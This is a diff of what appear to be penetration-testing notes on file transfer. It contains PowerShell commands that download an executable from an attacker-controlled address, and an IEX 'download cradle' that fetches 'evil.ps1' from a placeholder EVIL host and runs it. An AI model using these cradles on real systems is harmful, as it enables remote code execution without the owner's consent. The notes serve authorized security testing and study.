@@ -131,19 +131,13 @@ LIST
 $ rdesktop (ip) -r disk:share=/home/bayo/store
 ```
 * Powershell 
-```
+```powershell
 $ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"
 ```
-
 	* Download Cradle
-
-	testing 123 
-	```
+	```testingdownload
 	//check that it echos 
 	echo "IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1')"
-	```
-
-	```
 	//get rid of single quotes and pipe it - ippsec bastard video 23:10
 	echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | powershell -noprofile -
 	```
